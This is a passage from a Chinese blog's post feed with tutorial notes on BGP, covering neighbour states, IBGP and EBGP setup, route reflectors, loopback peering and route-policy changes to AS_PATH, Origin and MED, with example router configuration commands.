class="string">ip-prefix ntd          //匹配ip-prefix ntd</span></span><br><span class="line"><span class="attr">[R3-route-policy]apply</span> <span class="string">as-path 200 200 additive  //AS_PATH为200 200</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第三步</span>: <span class="string">在BGP中调用路由策略</span></span><br><span class="line"><span class="attr">[R3]bgp</span> <span class="string">100</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">10.10.3.3 route-policy tedu import //入方向调用路由策略</span></span><br></pre></td></tr></table></figure><p><strong>备注：</strong></p><ul><li>为什么添加的as号都为200呢，是只能添加200吗？  不是，可以添加任意值的as号</li><li>之所以都添加200，不添加其他AS号，仅仅是为了预防，因为AS_Path防止环路而导致路由无法传递</li><li>比如：如果我们添加了AS_path 500  ,如果我们要把路由传递给AS500的自制系统，就无法传递了</li><li>我们不清楚我们的前方会出现哪些AS号，所以我们尽量不要占用其他的AS号</li></ul><h2 id="路由优选之Origin"><a href="#路由优选之Origin" class="headerlink" title="路由优选之Origin"></a>路由优选之Origin</h2><h3 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h3><p><strong>Origin</strong></p><ul><li>Origin : i - IGP, e - EGP, ? - incomplete  （优先级）</li><li>IGP：优先级高，通过network命令注入到BGP路由表的路由，其Origin属性为 i</li><li>EGP : 次优的，Origin属性为  e</li><li>Incomplete：优先级低，如：通过import-route注入的路由，其Origin属性为  ?</li></ul><h3 id="配置命令-4"><a href="#配置命令-4" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">第一步</span>: <span class="string">创建ip-prefix 抓取10.10.4.4的路由</span></span><br><span class="line"><span class="attr">[R3]ip</span> <span class="string">ip-prefix ntd index 10 permit 10.10.4.4 32</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第二步</span>: <span class="string">创建路由策略，匹配地址前缀列表，修改路由的属性</span></span><br><span class="line"><span class="attr">[R3]route-policy</span> <span class="string">tedu permit node 10             //创建路由策略</span></span><br><span class="line"><span class="attr">[R3-route-policy]if-match</span> <span class="string">ip-prefix ntd          //匹配ip-prefix ntd</span></span><br><span class="line"><span class="attr">[R3-route-policy]apply</span> <span class="string">origin incomplete         //修改origin为Incomplete</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第三步</span>: <span class="string">在BGP中调用路由策略</span></span><br><span class="line"><span class="attr">[R3]bgp</span> <span class="string">100</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">10.10.3.3 route-policy tedu import //入方向调用路由策略</span></span><br></pre></td></tr></table></figure><h2 id="路由优选之MED"><a href="#路由优选之MED" class="headerlink" title="路由优选之MED"></a>路由优选之MED</h2><h3 id="MED"><a href="#MED" class="headerlink" title="MED"></a>MED</h3><p><strong>MED</strong></p><ul><li>多出口鉴别器，是可选非过渡属性，是一种度量值</li><li>MED默认值是0，值越小越优先</li><li>作用两个AS之间，收到MED属性的AS，默认不将这个属性通告给第三方AS</li></ul><h3 id="配置命令-5"><a href="#配置命令-5" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">第一步</span>: <span class="string">创建ip-prefix 抓取10.10.4.4的路由</span></span><br><span class="line"><span class="attr">[R3]ip</span> <span class="string">ip-prefix ntd index 10 permit 10.10.4.4 32</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第二步</span>: <span class="string">创建路由策略，匹配地址前缀列表，修改路由的属性</span></span><br><span class="line"><span class="attr">[R3]route-policy</span> <span class="string">tedu permit node 10             //创建路由策略</span></span><br><span class="line"><span class="attr">[R3-route-policy]if-match</span> <span class="string">ip-prefix ntd          //匹配ip-prefix ntd</span></span><br><span class="line"><span class="attr">[R3-route-policy]apply</span> <span class="string">cost 999                  //修改MED为999</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第三步</span>: <span class="string">在BGP中调用路由策略</span></span><br><span class="line"><span class="attr">[R3]bgp</span> <span class="string">100</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">10.10.3.3 route-policy tedu import //入方向调用路由策略</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 骨干网与WLAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-骨干网与WLAN2</title>
      <link href="/posts/backbone2.html"/>
      <url>/posts/backbone2.html</url>
      
        <content type="html"><![CDATA[<h1 id="骨干网与WLAN"><a href="#骨干网与WLAN" class="headerlink" title="骨干网与WLAN"></a>骨干网与WLAN</h1><h2 id="BGP通告原则"><a href="#BGP通告原则" class="headerlink" title="BGP通告原则"></a>BGP通告原则</h2><h3 id="BGP通告原则-1"><a href="#BGP通告原则-1" class="headerlink" title="BGP通告原则"></a>BGP通告原则</h3><p><strong>BGP传递给路由时需要遵循以下原则</strong></p><ul><li>第一条原则：只发布最优且有效（即下一跳地址可达）的路由</li><li>第二条原则：从EBGP邻居获取的路由，会发布给所有邻居</li><li>第三条原则：从IBGP邻居获取的路由，不会再发送给其他IBGP邻居（IBGP水平分割）</li></ul><h2 id="IBGP水平分割"><a href="#IBGP水平分割" class="headerlink" title="IBGP水平分割"></a>IBGP水平分割</h2><h3 id="IBGP水平分割-1"><a href="#IBGP水平分割-1" class="headerlink" title="IBGP水平分割"></a>IBGP水平分割</h3><p><strong>BGP通告原则三</strong></p><ul><li>从IBGP邻居学习到的BGP路由，不会再发送给其他IBGP邻居</li><li>该条原则也被称为”IBGP水平分割”</li><li>IBGP水平分割的作用：防止AS内部路由环路</li></ul><p><strong>IBGP水平分割的不足</strong></p><ul><li>导致域间路由无法传递</li></ul><p><strong>如何突破IBGP水平分割的限制</strong></p><ul><li>静态路由</li><li>在OSPF中引入BGP</li><li>IBGP全互联</li><li>路由反射器</li></ul><h2 id="路由反射器"><a href="#路由反射器" class="headerlink" title="路由反射器"></a>路由反射器</h2><h3 id="IBGP水平分割-2"><a href="#IBGP水平分割-2" class="headerlink" title="IBGP水平分割"></a>IBGP水平分割</h3><p><strong>IBGP水平分割</strong></p><ul><li>作用：用于防止AS内部出现环路</li><li>存在问题：BGP路由在AS内部无法传递</li><li>解决方案：IBGP邻居全互联，路由反射器</li></ul><h3 id="IBGP全互联的不足"><a href="#IBGP全互联的不足" class="headerlink" title="IBGP全互联的不足"></a>IBGP全互联的不足</h3><ul><li><p>邻居数量多：一个AS内有n台设备，需建立的邻居数为n（n-1）&#x2F;2</p></li><li><p>当设备数目很多时，设备配置十分复杂、路由维护十分复杂</p></li><li><p>当设备数目很多时，网络资源和设备资源的消耗都非常大</p></li></ul><h3 id="路由反射器-1"><a href="#路由反射器-1" class="headerlink" title="路由反射器"></a>路由反射器</h3><p><strong>反射器角色</strong></p><ul><li>路由反射器：RR（Route Reflector）</li><li>客户机</li><li>非客户机</li></ul><p><strong>反射器原理</strong></p><ul><li>客户机只需与RR之间建立IBGP连接，不需要与其他客户机建立IBGP连接，从而减少了IBGP连接数量</li><li>RR会将学习的路由反射出去，从而使得IBGP路由在AS内传播无需建立IBGP全互联，路由器反射器突破了IBGP水平分割限制</li><li>反射器通过命令指定自己的客户机，客户机不知道谁是反射器，只有反射器知道谁是客户机，没有指定为客户机的路由器，就是非客户机</li></ul><p><img src="/../img/img_artical/net_sec/7.2.1.png" alt="7.2.1"></p><h3 id="反射规则"><a href="#反射规则" class="headerlink" title="反射规则"></a>反射规则</h3><p><strong>反射规则</strong></p><ul><li>RR从非客户机收到的路由会反射给客户机，会发布给EBGP邻居</li><li>RR从非客户机收到的路由不会反射给非客户机</li><li>RR从客户机收到的路由会反射给客户机和非客户机，会发布给EBGP邻居</li><li>RR从EBGP邻居收到的路由，会反射给所有的客户机、非客户机</li></ul><p>注意此处<strong>反射</strong>和<strong>发送</strong>的区别。<strong>发送</strong>指的是传统情况下（相当于RR不存在的场景下）的BGP路由传递行为，而<strong>反射</strong>指的是遵循路由反射规则的情况下，RR执行的路由传递动作，被反射出去的路由会被RR插入特殊的路径属性</p><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]bgp</span> <span class="string">200</span></span><br><span class="line"><span class="attr">[R2-bgp]router-id</span> <span class="string">2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-bgp]peer</span> <span class="string">192.168.12.1 as-number 200</span></span><br><span class="line"><span class="attr">[R2-bgp]peer</span> <span class="string">192.168.12.1 reflect-client         //指定192.168.12.1为客户机</span></span><br></pre></td></tr></table></figure><h3 id="路由反射器防止环路"><a href="#路由反射器防止环路" class="headerlink" title="路由反射器防止环路"></a>路由反射器防止环路</h3><p><strong>路由反射器突破水平分割限制可能导致环路发生</strong></p><ul><li>RR的设定使得IBGP水平分割原则失效，这就可能导致环路的产生，为此RR会为BGP路由添加两个特殊的路径属性来避免出现环路</li><li>Originator_ID：始发者ID属性，属性用于防止集群内产生路由环路</li><li>Cluster_List：簇列表属性，属性用于防止集群间产生路由环路</li><li>Originator_ID、Cluster_List属性都属于可选非过渡类型</li></ul><p><strong>Originator ID属性</strong></p><ul><li>RR将一条BGP路由进行反射时会在反射出去的路由中增加Originator_ID，其值为本地AS中通告该路由的BGP路由器Router ID</li><li>若AS内存在多个RR，则Originator_ID属性由第一个RR创建，并且不被后续的RR所更改。</li><li>当BGP路由器收到一条携带Originator_ID属性的IBGP路由，并且Originator_ID属性值与自身的Router ID相同，则它不会学习该路由</li></ul><p><strong>路由反射簇（Cluster）</strong></p><ul><li><p>路由反射簇包括反射器RR及其Client。一个AS内允许存在多个路由反射簇（如下图）。</p></li><li><p>每一个簇都有唯一的簇ID（Cluster_ID，默认为RR的BGP Router ID ）。</p></li><li><p>当一条路由被反射器反射后，该RR（该簇）的Cluster_ID就会被添加至路由的Cluster_list属性中。</p></li><li><p>当RR收到一条携带Cluster_list属性的BGP路由，且该属性值中包含该簇的Cluster_ID时，RR认为该条路由存在环路，因此将忽略关于该条路由的更新</p></li></ul><h2 id="环回口建立IBGP邻居"><a href="#环回口建立IBGP邻居" class="headerlink" title="环回口建立IBGP邻居"></a>环回口建立IBGP邻居</h2><h3 id="BGP的稳定性"><a href="#BGP的稳定性" class="headerlink" title="BGP的稳定性"></a>BGP的稳定性</h3><p><strong>IBGP：</strong></p><ul><li>一般使用环回口建立IBGP邻居，从而提高稳定性</li><li>指定建立IBGP邻居的源地址为loopback地址</li></ul><p><strong>Loopback接口：</strong></p><ul><li>用loopback接口建立邻居更加稳定和可靠</li><li>使用物理接口的IP地址建立邻居，当物理接口和物理链路发送故障，BGP邻居就会down掉</li><li>而使用loopback接口IP地址建立邻居，假设两台设备之间有3条物理链路，即便坏掉其中2条物理链路，即便只有1条物理链路互通，就可以保证BGP邻居的正常</li></ul><h3 id="配置命令-1"><a href="#配置命令-1" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]bgp</span> <span class="string">200</span></span><br><span class="line"><span class="attr">[R2-bgp]router-id</span> <span class="string">2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-bgp]peer</span> <span class="string">10.10.1.1 as-number 200</span></span><br><span class="line"><span class="attr">[R2-bgp]peer</span> <span class="string">10.10.1.1 connect-interface LoopBack()</span></span><br></pre></td></tr></table></figure><h2 id="更新源检测机制"><a href="#更新源检测机制" class="headerlink" title="更新源检测机制"></a>更新源检测机制</h2><h3 id="更新源检测机制-1"><a href="#更新源检测机制-1" class="headerlink" title="更新源检测机制"></a>更新源检测机制</h3><p><strong>TCP连接源地址</strong></p><ul><li>缺省情况下，BGP使用报文出接口作为TCP连接的本地接口</li><li>在部署IBGP对等体关系时，建议使用LoopBack地址作为更新源地址</li><li>Loopback接口非常稳定，可以借助AS内的冗余链路来保证可靠性</li><li>在部署EBGP对等体关系时，通常使用直连接口的IP地址作为源地址，如若使用Loopback接口建立EBGP对等体关系，则应注意EBGP多跳问题</li></ul><p><img src="/../img/img_artical/net_sec/7.2.2.png" alt="7.2.2"></p><h3 id="EBGP之间为何不能使用Loopback接口建立对等体"><a href="#EBGP之间为何不能使用Loopback接口建立对等体" class="headerlink" title="EBGP之间为何不能使用Loopback接口建立对等体"></a>EBGP之间为何不能使用Loopback接口建立对等体</h3><ul><li>BGP有直连检测机制</li><li>BGP要求，凡是建立EBGP邻居的路由器，必须使用直连网段，使用物理接口的IP地址，建立邻居</li><li>原因：因为EBGP要求稳定性和可靠性，  使用直连网段，使用物理接口建立邻居，BGP路由器能够感知到链路故障， 能够及时作出调整，如果用非直连网段建立EBGP邻居，路由器无法实时且有效的感知到网络故障</li><li>原理：EBGP报文中TTL值为1，</li><li>当经过一台路由器转发的时候，TTL值减去1，当TTL值为0的时候，报文被丢弃，所以无法建立BGP邻居关系</li><li>解决方法：突破直连检测机制</li></ul><p><strong>配置命令</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">peer</span> <span class="string">10.10.1.1 ebgp-max-hop  100   //修改bgp报文最大TTL为100  </span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 骨干网与WLAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-骨干网与WLAN1</title>
      <link href="/posts/backbone1.html"/>
      <url>/posts/backbone1.html</url>
      
        <content type="html"><![CDATA[<h1 id="骨干网与WLAN"><a href="#骨干网与WLAN" class="headerlink" title="骨干网与WLAN"></a>骨干网与WLAN</h1><h2 id="BGP概述"><a href="#BGP概述" class="headerlink" title="BGP概述"></a>BGP概述</h2><h3 id="动态路由分类"><a href="#动态路由分类" class="headerlink" title="动态路由分类"></a>动态路由分类</h3><p><strong>IGP：内部网关协议</strong></p><ul><li>AS内部使用IGP来计算和发现路由，如OSPF</li></ul><p><strong>EGP：外部网关协议</strong></p><ul><li>AS与AS之间使用BGP来传递和控制路由</li></ul><h3 id="AS"><a href="#AS" class="headerlink" title="AS"></a>AS</h3><p><strong>AS：自治系统</strong></p><ul><li>AS：Autonomous System 自治系统，指由一组网络和路由器组成的网络</li><li>每个自治系统都有唯一的一个编号，即AS号</li><li>AS号可以帮助互联网中的路由器找到要到达目的地的IP地址的最短路径</li><li>AS号由互联网分配机构IANA（互联网分配号码管理局）分配</li><li>AS号的范围被划分为两类：公共AS号和私有AS号</li><li>公共AS号是指由IANA分配的AS号，可用于在全球范围内标识自治系统</li><li>私有AS号是指由互联网注册机构（IR）分配的AS号，用于在私有互联网中标识自治系统</li></ul><p><strong>2字节AS号范围是0~65535</strong></p><ul><li>1<del>64511为公有AS，64512</del>65535为私有AS</li></ul><p><strong>4字节AS号范围是0~4294967295</strong></p><ul><li>4200000000~4294967294为私有AS号</li></ul><p><strong>网络规模扩大，路由数量不断增长，IGP已无法管理，AS的概念诞生</strong></p><p><strong>AS与AS之间通信需要使用哪种路由协议？</strong></p><ul><li>在AS之间使用BGP协议进行路由传递</li></ul><h3 id="BGP发展历史"><a href="#BGP发展历史" class="headerlink" title="BGP发展历史"></a>BGP发展历史</h3><p><img src="/../img/img_artical/net_sec/7.1.1.png" alt="7.1.1"></p><h3 id="BGP在企业中的应用"><a href="#BGP在企业中的应用" class="headerlink" title="BGP在企业中的应用"></a>BGP在企业中的应用</h3><p><img src="/../img/img_artical/net_sec/7.1.2.png" alt="7.1.2"></p><p><strong>场景一：遍布全国大型政企单位之间，或大型数据中心</strong></p><p><strong>场景二：运营商骨干网</strong></p><h3 id="BGP概述-1"><a href="#BGP概述-1" class="headerlink" title="BGP概述"></a>BGP概述</h3><p><strong>BGP：Border Gateway Protocol 边界网关协议</strong></p><ul><li>作用：实现在AS与AS之间动态交换路由信息</li><li>稳定：BGP是基于TCP协议建立的，使用端口号TCP179，非常稳定</li><li>BGP是公有协议，任何厂商的设备都支持BGP</li><li>BGP位于OSI的第7层 (应用层)</li><li>2006年之后单播IPv4网络使用的版本是BGP-4</li><li>IPv6使用的版本是MP-BGP</li></ul><h3 id="BGP特点"><a href="#BGP特点" class="headerlink" title="BGP特点"></a>BGP特点</h3><ul><li>稳定性非常高</li><li>传递大量路由</li><li>丰富的路由传递策略</li></ul><h2 id="BGP基本概念"><a href="#BGP基本概念" class="headerlink" title="BGP基本概念"></a>BGP基本概念</h2><h3 id="BGP特征"><a href="#BGP特征" class="headerlink" title="BGP特征"></a>BGP特征</h3><ul><li>路由器之间的BGP会话基于TCP连接而建立</li><li>运行BGP的路由器被称为BGP发言者（BGP Speaker），或BGP路由器</li><li>两个建立BGP会话的路由器互为对等体（Peer），BGP对等体之间交换BGP路由表</li><li>BGP路由器只发送增量的BGP路由更新，或进行触发式更新（不会周期性更新）</li><li>BGP能够传递大批量的路由，可在大规模网络中应用</li></ul><p><img src="/../img/img_artical/net_sec/7.1.3.png" alt="7.1.3"></p><h3 id="BGP邻居类型"><a href="#BGP邻居类型" class="headerlink" title="BGP邻居类型"></a>BGP邻居类型</h3><p><strong>BGP邻居类型</strong></p><ul><li>EBGP：运行于不同AS之间，默认优先级255</li><li>IBGP：运行于同一AS内部，默认优先级255</li></ul><p><img src="/../img/img_artical/net_sec/7.1.4.png" alt="7.1.4"></p><h3 id="BGP报文"><a href="#BGP报文" class="headerlink" title="BGP报文"></a>BGP报文</h3><p>BGP邻居的建立过程主要有5种报文</p><table><thead><tr><th align="left">报文</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Open报文</td><td align="left">用于建立BGP邻居</td></tr><tr><td align="left">Update报文</td><td align="left">用于在邻居之间传递路由信息和撤销路由</td></tr><tr><td align="left">Keepalive报文</td><td align="left">用于维护邻居关系，保持BGP连接，周期性发送，60秒发一次</td></tr><tr><td align="left">notification报文</td><td align="left">通知报文，用于通知BGP邻居之间的报错信息，用于断开BGP连接</td></tr><tr><td align="left">Route-refresh报文</td><td align="left">策略更改后，让邻居重新发送路由信息</td></tr></tbody></table><h3 id="BGP邻居关系建立"><a href="#BGP邻居关系建立" class="headerlink" title="BGP邻居关系建立"></a>BGP邻居关系建立</h3><p><img src="/../img/img_artical/net_sec/7.1.5.png" alt="7.1.5"></p><h3 id="BGP状态机"><a href="#BGP状态机" class="headerlink" title="BGP状态机"></a>BGP状态机</h3><table><thead><tr><th align="left">Peer状态名称</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">Idle</td><td align="left">初始化状态，tcp未连接状态，邻居的状态为idle ,  当bgp设备和邻居进行tcp 连接时，会从当前的状态转为connect 状态</td></tr><tr><td align="left">Connect</td><td align="left">正在进行TCP连接，如果TCP连接建立失败则进入Active状态，反复尝试连接，如果tcp 建立连接成功，bgp 设备会向邻居发送open报文，状态也会转为OpenSent  状态</td></tr><tr><td align="left">Active</td><td align="left">TCP连接没建立成功，反复尝试TCP连接，如果成功，状态依然可以转为opensent 状态，如果重传计时器超时，依然没有收到邻居回应，bgp设备会返回上一个状态，上一个是connect  状态</td></tr><tr><td align="left">OpenSent</td><td align="left">TCP连接已经建立成功，开始发送Open报文，协商邻居的建立，如果bgp设备给邻居发送open报文后，如果收到来自邻居的回复，并且回复的报文是正确的，bgp 设备会继续发送keep alive 报文，状态转为  Open Comfirm 状态，如果bgp设备给邻居发送open报文后，如果收到来自邻居的回复，但是回复的报文有错误，bgp 设备会向邻居发送notification 报文（用于断开bgp连接状态），断开后会跳转到最初的idle 状态</td></tr><tr><td align="left">OpenConfirm</td><td align="left">协商成功，自己发送Keepalive报文，等待对方的Keepalive报文，如果收到邻居发来的keep alive 报文，状态会转为established  建立状态，如果收到邻居发来的notification 报文，状态会跳转为 idle 状态</td></tr><tr><td align="left">Established</td><td align="left">已经收到对方的Keepalive报文，开始使用Update通告路由信息，如果收到邻居发来的错误的update 报文或者keepalive 报文，bgp设备会发送notification 报文，通知邻居断开连接，会回到idle 初始化状态</td></tr></tbody></table><p><img src="/../img/img_artical/net_sec/7.1.6.png" alt="7.1.6"></p><h2 id="EBGP配置"><a href="#EBGP配置" class="headerlink" title="EBGP配置"></a>EBGP配置</h2><h3 id="EBGP配置-1"><a href="#EBGP配置-1" class="headerlink" title="EBGP配置"></a>EBGP配置</h3><p><strong>配置EBGP邻居关系</strong></p><p><img src="/../img/img_artical/net_sec/7.1.7.png" alt="7.1.7"></p><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>配置R1</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]bgp</span> <span class="string">100                                //启动BGP进程，指定AS号</span></span><br><span class="line"><span class="attr">[R1-bgp]router-id</span> <span class="string">1.1.1.1                  //配置BGP的router-id</span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.12.2 as-number 200    //指定邻居地址和AS号</span></span><br><span class="line"><span class="attr">[R1-bgp]network</span> <span class="string">192.168.1.0 24             //注入路由</span></span><br></pre></td></tr></table></figure><p><strong>配置R2</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]bgp</span> <span class="string">200                                //启动BGP进程，指定AS号</span></span><br><span class="line"><span class="attr">[R1-bgp]router-id</span> <span class="string">2.2.2.2                  //配置BGP的router-id</span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.12.1 as-number 100    //指定邻居地址和AS号</span></span><br><span class="line"><span class="attr">[R1-bgp]network</span> <span class="string">192.168.2.0 24             //注入路由</span></span><br></pre></td></tr></table></figure><h3 id="BGP路由的生成"><a href="#BGP路由的生成" class="headerlink" title="BGP路由的生成"></a>BGP路由的生成</h3><p><strong>如何产生路由</strong></p><ul><li>不同于IGP路由协议，BGP并不会发现并计算产生路由</li><li>BGP只会将IGP路由表中已存在的路由“搬”到BGP路由表中，称为注入路由</li><li>BGP将注入的路由通过Update报文“传递”给BGP邻居</li></ul><p><strong>BGP注入路由的方式有两种</strong></p><ul><li>network</li><li>import-route</li></ul><h3 id="BGP注入路由方式"><a href="#BGP注入路由方式" class="headerlink" title="BGP注入路由方式"></a>BGP注入路由方式</h3><p><strong>Network</strong></p><ul><li>Network只会注入IP路由表中已经存在的路由条目</li><li>Network优势是精准注入，不足是只能逐条注入路由，配置繁琐</li></ul><p><strong>import-route</strong></p><ul><li>import-route可以批量注入路由，可以将其他协议的路由注入BGP路由表</li><li>注入直连路由</li><li>注入静态路由</li><li>注入OSPF路由</li><li>……</li></ul><h2 id="邻居表和路由表"><a href="#邻居表和路由表" class="headerlink" title="邻居表和路由表"></a>邻居表和路由表</h2><h3 id="BGP邻居表"><a href="#BGP邻居表" class="headerlink" title="BGP邻居表"></a>BGP邻居表</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R1&gt;display</span> <span class="string">bgp peer </span></span><br><span class="line"></span><br><span class="line"> <span class="attr">BGP</span> <span class="string">local router ID : 1.1.1.1</span></span><br><span class="line"> <span class="attr">Local</span> <span class="string">AS number : 100</span></span><br><span class="line"> <span class="attr">Total</span> <span class="string">number of peers : 1      Peers in established state : 1</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">Peer</span>          <span class="string">V   AS  MsgRcvd  MsgSent  OutQ  Up/Down     State       PrefRcv</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">192.168.12.2</span>  <span class="string">4   200   45       46      0    00:42:35  Established     1</span></span><br></pre></td></tr></table></figure><h3 id="BGP路由表"><a href="#BGP路由表" class="headerlink" title="BGP路由表"></a>BGP路由表</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R1&gt;display</span> <span class="string">bgp routing-table </span></span><br><span class="line"></span><br><span class="line"> <span class="attr">BGP</span> <span class="string">Local router ID is 1.1.1.1 </span></span><br><span class="line"> <span class="attr">Status</span> <span class="string">codes: * - valid, &gt; - best, d - damped,</span></span><br><span class="line">               <span class="attr">h</span> <span class="string">- history,  i - internal, s - suppressed, S - Stale</span></span><br><span class="line">               <span class="attr">Origin</span> : <span class="string">i - IGP, e - EGP, ? - incomplete</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">Total</span> <span class="string">Number of Routes: 2</span></span><br><span class="line">      <span class="attr">Network</span>            <span class="string">NextHop        MED        LocPrf    PrefVal Path/Ogn</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">*&gt;</span>   <span class="string">192.168.1.0        0.0.0.0         0                     0      i</span></span><br><span class="line"> <span class="attr">*&gt;</span>   <span class="string">192.168.2.0        192.168.12.2    0                     0      200i</span></span><br></pre></td></tr></table></figure><h2 id="IBGP全互联"><a href="#IBGP全互联" class="headerlink" title="IBGP全互联"></a>IBGP全互联</h2><h3 id="Next-Hop"><a href="#Next-Hop" class="headerlink" title="Next_Hop"></a>Next_Hop</h3><p><strong>BGP路由中的Next_Hop属性设置规则</strong></p><ul><li><p>BGP路由器在向EBGP邻居发布路由时，会把该路由的下一跳设置为本地与对端建立的BGP邻居关系的接口地址</p></li><li><p>BGP路由器将本地始发路由发布给IBGP邻居时，会把该路由的下一跳设置为本地与对端建立的BGP邻居关系的接口地址</p></li><li><p>路由器在收到EBGP邻居发布的路由后，在将路由传递给自己的IBGP邻居时，默认不修改路由的下一跳地址</p></li></ul><h3 id="Next-Hop的缺省操作"><a href="#Next-Hop的缺省操作" class="headerlink" title="Next_Hop的缺省操作"></a>Next_Hop的缺省操作</h3><p><strong>使用peer next-hop-local命令可以在设置向IBGP对等体通告路由时，把下一跳设为本地与对端建立BGP邻居关系的接口地址</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]bgp</span> <span class="string">200</span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.12.2 as-number 200</span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.12.2 next-hop-local</span></span><br></pre></td></tr></table></figure><h3 id="IBGP全互联-1"><a href="#IBGP全互联-1" class="headerlink" title="IBGP全互联"></a>IBGP全互联</h3><p><strong>实现AS100内R4的10.10.4.4 和 AS300内R5的10.10.5.5互通</strong></p><p><img src="/../img/img_artical/net_sec/7.1.8.png" alt="7.1.8"></p><h3 id="IBGP配置步骤"><a href="#IBGP配置步骤" class="headerlink" title="IBGP配置步骤"></a>IBGP配置步骤</h3><p><strong>配置步骤</strong></p><ul><li>R4和R1建立EBGP邻居关系</li><li>AS200内部R1&#x2F;R2&#x2F;R3部署OSPF</li><li>R1&#x2F;R2&#x2F;R3建立IBGP全互联</li><li>R3和R5建立EBGP邻居关系</li><li>R4和R5中使用network注入路由</li></ul><h3 id="配置命令-1"><a href="#配置命令-1" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>配置R4</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R4]int</span> <span class="string">g0/0/0</span></span><br><span class="line"><span class="attr">[R4-G0/0/0]ip</span> <span class="string">add 192.168.14.4 24</span></span><br><span class="line"><span class="attr">[R4-G0/0/0]int</span> <span class="string">lo0</span></span><br><span class="line"><span class="attr">[R4-LoopBack0]ip</span> <span class="string">add 10.10.4.4 32</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R4]bgp</span> <span class="string">100</span></span><br><span class="line"><span class="attr">[R4-bgp]router-id</span> <span class="string">4.4.4.4</span></span><br><span class="line"><span class="attr">[R4-bgp]peer</span> <span class="string">192.168.14.1 as 200    //和R1建立外部邻居</span></span><br><span class="line"><span class="attr">[R4-bgp]network</span> <span class="string">10.10.4.4 32        //注入路由</span></span><br></pre></td></tr></table></figure><p><strong>配置R1</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 